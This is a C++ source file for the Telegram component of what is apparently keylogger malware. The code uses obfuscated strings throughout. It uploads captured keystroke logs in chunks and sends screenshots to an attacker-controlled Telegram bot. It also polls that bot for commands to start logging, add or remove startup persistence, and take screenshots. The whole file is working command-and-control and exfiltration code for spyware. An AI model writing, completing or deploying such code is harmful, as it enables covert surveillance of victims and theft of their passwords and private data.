#include "TelegramBot.h"
#include "Keylogger.h" // Include Keylogger.h
#include "obfuscate.h" // Include the obfuscation header
#include <cpr/cpr.h>
#include <vector>
#include <chrono>
#include <thread>

// Assume isRunning is a global flag for now. We will refactor this later.
extern bool isRunning;

TelegramBot::TelegramBot(const std::string& token, const std::string& chatID)
    : botToken(token), chatID(chatID), keylogger(nullptr) {}

void TelegramBot::setKeylogger(Keylogger* keylogger) {
    this->keylogger = keylogger;
}

void TelegramBot::sendLog(const std::string& logContent) {
    if (logContent.empty()) {
        return;
    }

    const int MAX_TELEGRAM_MESSAGE_LENGTH = 3500;
    bool all_sent_successfully = true;

    for (size_t i = 0; i < logContent.length(); ) {
        std::string message_part = logContent.substr(i, MAX_TELEGRAM_MESSAGE_LENGTH);
        if (message_part.empty()) {
            break;
        }

        try {
            cpr::Response r = cpr::Post(cpr::Url{OBFUSCATE("https://api.telegram.org/bot") + botToken + OBFUSCATE("/sendMessage")},
                                        cpr::Payload{{OBFUSCATE("chat_id"), chatID},
                                                     {OBFUSCATE("text"), message_part}});

            if (r.status_code != 200) {
                all_sent_successfully = false;
                break;
            }
        } catch (const cpr::Error& e) {
            all_sent_successfully = false;
            break;
        } catch (const std::exception& e) {
            all_sent_successfully = false;
            break;
        } catch (...) {
            all_sent_successfully = false;
            break;
        }
        i += message_part.length();
    }

    if (all_sent_successfully) {
        // The responsibility of deleting the log file will be moved to the main loop.
    }
}

void TelegramBot::sendScreenshot(const std::string& imagePath) {
    cpr::Response r = cpr::Post(cpr::Url{OBFUSCATE("https://api.telegram.org/bot") + botToken + OBFUSCATE("/sendPhoto")},
                                cpr::Multipart{{"chat_id", chatID},
                                               {"photo", cpr::File{imagePath}}});
}

void TelegramBot::checkCommands() {
    std::string url = OBFUSCATE("https://api.telegram.org/bot") + botToken + OBFUSCATE("/getUpdates");
    if (lastUpdateID != 0) {
        url += OBFUSCATE("?offset=") + std::to_string(lastUpdateID + 1);
    }

    cpr::Response r = cpr::Get(cpr::Url{url});

    if (r.status_code == 200) {
        std::string response_body = r.text;
        size_t pos = 0;
        while ((pos = response_body.find(OBFUSCATE("\"update_id\":"), pos)) != std::string::npos) {
            size_t update_id_start = response_body.find(":", pos) + 1;
            size_t update_id_end = response_body.find(",", update_id_start);
            long long current_update_id = std::stoll(response_body.substr(update_id_start, update_id_end - update_id_start));

            size_t message_text_pos = response_body.find(OBFUSCATE("\"text\":"), pos);
            if (message_text_pos != std::string::npos) {
                size_t text_start = response_body.find("\"", message_text_pos + 7) + 1;
                size_t text_end = response_body.find("\"", text_start);
                std::string command = response_body.substr(text_start, text_end - text_start);

                if (command == CMD_START) {
                    isRunning = true;
                } else if (command == CMD_PERSISTENCE_ENABLE) {
                    if (keylogger) {
                        keylogger->addToStartup();
                    }
                } else if (command == CMD_PERSISTENCE_DISABLE) {
                    if (keylogger) {
                        keylogger->removeFromStartup();
                    }
                } else if (command == CMD_SCREENSHOT) {
                    if (keylogger) {
                        keylogger->takeScreenshot();
                    }
                }
            }
            pos = update_id_end;
            if (current_update_id > lastUpdateID) {
                lastUpdateID = current_update_id;
            }
        }
    }
}
